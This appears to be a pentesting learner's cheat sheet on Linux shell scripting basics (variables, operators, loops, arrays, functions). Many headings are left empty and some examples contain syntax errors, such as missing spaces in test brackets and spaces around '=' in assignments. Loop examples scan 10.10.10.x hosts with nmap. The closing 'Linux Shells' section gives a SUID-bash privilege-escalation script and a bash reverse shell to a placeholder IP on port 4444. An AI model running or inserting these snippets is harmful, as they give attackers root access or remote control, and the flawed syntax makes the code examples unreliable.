Linux Shell Scripting and One-Liners:
====================================
Basics:
	Shell Script is a text file that contains a sequence of shell commands.
	Making the script executable:
		A. For .sh:
		B. For <no extension>:
	Note:
		Read Linux Shell Commands Sheet to read about Shell Commands.
First line:
	Syntax:
		A. #!/bin/sh
		B. #! /bin/sh
		Note:
			We should use /bin/sh only as /bin/sh is basically a symlink to the system shell which can be /bin/bash or /bin/dash depending on the system.
	Understanding it:
		#! :(aka Shebang)
			It tells the system to exeucte the script/code using the binary mentioned next to it.
			'#' also tells interpreter to treat this line as a comment.
Comments:
	#Single-line comment.
Script Arguments:
	Argument Variables:
		$1 to $9 => 1st 9 variables passed
		Example:
			Code:
				echo first $1
				echo last $4
			Execution:
				./script.sh 100 20 80 hello
			Output:
				first 100
				last hello
	Shift Command:
Script Variables:
	Creating Variables:
		name="robot"
			echo "hello $name" => hello robot
			echo "${name}12" => robot12
			echo $name => robot
			echo '$name' => $name
	Special Variables:
		$0 => Script_name
		$? => Exit status of the last process
		$RANDOM => Returns a random number
		$$ => Script's PID
		$# => Total_Arguments
		Note:
			We can use Environment variables too.
	Taking Input:
		Read:
			Basics:
			Usage:
				read variable_name
				read -p 'print this' var_name
				read -sp 'print this' var_name => ideal for entering paword, it dont shows what is being entered, -s stands for 'silent'
				Flags:
	Printing Output:
		echo	

Quotes:
	echo $100
	echo '$100'
	echo "$100"
Operators:		
	Arithmetic Operators:
		Binary Operators:
		Unary Operators:
	Logical Operators:
		Binary Operators:
			&& => and
			|| => or
		Unary Operators:
			TRUE => 0
			FALSE => NON-ZERO
	Conditional Operators:
		For Strings:
			Binary Operators:
				!=
				=
			Unary Operators:
				-z
				-n
		For Integers:
			Binary Operators:
				-eq
				-ne
				-gt
				-lt
				-ge
				-le
			Unary Operators:
		File & Directory Operators:
			Binary Operators:
				-nt => Newer than
				-ot => Older than
			Unary Operators:
				-f:
					Syntax:
						-f <file_name>
				-e:
				-s:
				-d:
				-h:
		Device Operators:
			Binary Operators:
			Unary Operators:
				-b:
				-c:
				-p:
				-S:
		Permission Operators:
			Binary Operators:
			Unary Operators:
				-r
				-w
				-x
				-u
				-g
				-k
Flow of Control:
	Conditional Statements:
		if:
			Syntax:
			Example:
				if [ $age -lt 16]
				then
					echo $age
				fi
		else:
			Syntax:
			Example:
				if [ $age -lt 16]
				then
					echo $age
				else
					echo 10
				fi
		elif:
			Syntax:
			Example:
				if [ $age -lt 16]
				then
					echo $age
				elif [ $age -gt 60]
				then
					echo 100
				else
					echo 10
				fi
	Cases:
	Loops:
		For:
			Examples:
				Way-1:(Multi-Liner)
					for ip in $(seq 1 10)
					do 
						nmap 10.10.10.$ip
					done
				Way-2:(One-Liner)
					for ip in {1..10}; do nmap 10.10.10.$ip; done
		While:
			Examples:
				counter=1
				while[$counter -le 10]
				do
					nmap 10.10.10.$counter
					((counter++)) # it uses (()) double-paranthesis construct to perform arithemtic expansion
				done
	Statments:
		Do:
		Done:
Command Substitution:(executing shell commands from script)
	Basics:
		var_name=$(command)
		user=$(whoami)
		echo "directory is $(pwd)"
		echo "directory is `pwd`"
	File Management:
SubShell:
Executing other scripts/programs from within the script:
Arrays:
	Creating an Array:
		array_name=(value1 value2 value3)
		Example:
			cars=('honda' 'audi' 'bmw' 'tesla')
	Printing Values of an array:
		echo "${array_name[element_id]}"
	Removing an element:
		unset array_name[element_id]
	Changing value of an element:
		array_name[element_id] = new_value
Functions:
	Basics:
		Read Linux Shell Commands Sheet
	Defining a Function:
		Method-1:
			Single-Line Sytax:
				Read Linux Shell Commands Sheet
			Multi-Line Sytax:
				function_name () {
					commands
				}
		Method-1:
			Single-Line Sytax:
				Read Linux Shell Commands Sheet
			Multi-Line Sytax:
				function function_name {
					commands
				}
	Calling a Function:
	Passing args to function:
		p1 () {
			echo "hello $1"
		}
		p1 $RANDOM
	returning value from function:
		p2 () {
			return $RANDOM
		}
		p2
	local variables:
		name = x
		p3 () {
			local name = y
			echo $name
		}
		p3
		echo $name

Linux Shells:
	shell1.sh:
		#!/bin/bash
		cp /bin/bash /tmp/rootbash
		chmod +xs /tmp/rootbash
		Note:
			After running it:
				$ /tmp/rootbash -p
	shell2.sh:
		#!/bin/bash
		bash -i >& /dev/tcp/10.10.10.10/4444 0>&1